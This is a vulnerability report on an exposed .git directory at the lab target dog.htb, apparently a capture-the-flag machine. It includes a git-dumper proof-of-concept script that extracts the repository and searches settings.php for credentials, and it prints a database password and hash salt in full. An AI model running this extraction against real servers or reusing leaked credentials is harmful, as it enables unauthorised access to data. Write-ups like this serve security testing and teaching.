# Exposed Git Repository - Source Code Disclosure

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-22 19:47:03 UTC
**Target:** http://dog.htb
**Endpoint:** /.git/
**Method:** GET
**CWE:** CWE-527
**CVSS:** 9.4

## Description

A publicly accessible .git directory was discovered on the web server at http://dog.htb/.git/. This exposed the complete Git repository including all source code, configuration files, and commit history. The repository contained sensitive information including database credentials, hash salts, and application architecture details.

## Impact

Complete source code disclosure enables attackers to identify vulnerabilities, extract hardcoded credentials, understand application logic, and plan targeted attacks. The exposed database credentials (root:BackDropJ2024DS2024@127.0.0.1/backdrop) provide direct access to the backend database, potentially allowing data exfiltration or modification.

## Technical Analysis

The web server is configured to allow public access to the .git directory. By accessing http://dog.htb/.git/, the entire Git repository structure is exposed including:
- HEAD reference pointing to current branch
- config file with repository settings
- objects directory containing all Git objects
- commit history revealing author information (root <dog@dog.htb>)

Using git-dumper or similar tools, the complete repository was extracted revealing:
- Database connection string: mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop
- Hash salt: aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ
- Complete Backdrop CMS source code
- Configuration files in files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/

## Proof of Concept

1. Navigate to http://dog.htb/.git/
2. Download the repository using git-dumper: git-dumper http://dog.htb/.git/ /workspace/git_extract
3. Extracted 2873 files from commit 8204779
4. Review settings.php for database credentials

```
import subprocess
import os

# Install git-dumper if needed
subprocess.run(["pip", "install", "git-dumper"], check=False)

# Download the exposed git repository
target_url = "http://dog.htb/.git/"
output_dir = "/workspace/git_extract"

os.makedirs(output_dir, exist_ok=True)
result = subprocess.run(
    ["git-dumper", target_url, output_dir],
    capture_output=True,
    text=True
)

print(f"Extraction status: {result.returncode}")
print(f"Files extracted to: {output_dir}")

# Check for sensitive files
settings_path = os.path.join(output_dir, "settings.php")
if os.path.exists(settings_path):
    with open(settings_path, 'r') as f:
        content = f.read()
        if "password" in content.lower():
            print("Database credentials found in settings.php")
```

## Remediation

1. Block access to .git directory using web server configuration:
   - For Apache: Add a .htaccess rule or modify site config to deny access to .git
   - For Nginx: Add location block with deny all for .git paths

2. Remove the .git directory from production servers entirely if not needed

3. Implement security headers to prevent directory listing

4. Use automated scanning to detect exposed version control directories before deployment

5. Ensure production deployments use compiled/artifact builds without source control metadata
